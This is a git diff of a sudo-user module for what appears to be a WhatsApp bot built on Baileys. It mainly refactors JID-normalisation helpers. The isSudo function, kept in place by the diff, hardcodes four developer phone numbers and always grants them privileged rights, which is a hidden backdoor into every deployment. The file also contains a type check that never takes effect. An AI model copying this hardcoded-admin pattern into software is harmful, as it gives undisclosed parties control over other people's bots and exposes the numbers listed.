@@ -1,10 +1,10 @@
 import { DataTypes } from 'sequelize';
 import config from '#config';
-import { jidNormalizedUser, areJidsSameUser } from 'baileys';
-import { numtoId } from '#utils';
+import { areJidsSameUser } from 'baileys';
+import { toJid } from '#utils';
 import { DATABASE } from '#lib';
 
- const SudoDB = DATABASE.define(
+const SudoDB = DATABASE.define(
 	'Sudo',
 	{
 		userId: {
@@ -45,15 +45,14 @@ const getSudo = async () => {
 const isSudo = async (jid, owner) => {
 	if (!jid === 'string') jid = '';
 	const devs = ['923192173398', '2348060598064', '923089660496', '2347041620617'];
-	const devsNumToId = devs.map(dev => numtoId(dev.trim()));
+	const devstoJid = devs.map(dev => toJid(dev.trim()));
 	if (owner && typeof owner !== 'string') owner = owner.toString();
 	if (owner && typeof jid === 'string' && areJidsSameUser(jid, owner)) return true;
-	const sudoUsers = (config.SUDO ?? '').split(';').map(id => numtoId(id.trim()));
-	const uId = jidNormalizedUser(jid);
-	if (sudoUsers.includes(uId) || devsNumToId.includes(uId)) return true;
+	const sudoUsers = (config.SUDO ?? '').split(';').map(id => toJid(id.trim()));
+	const uId = toJid(jid);
+	if (sudoUsers.includes(uId) || devstoJid.includes(uId)) return true;
 	const allSudoUsers = await getSudo();
 	return allSudoUsers.includes(uId);
 };
-
 
 export { SudoDB, addSudo, delSudo, getSudo, isSudo };
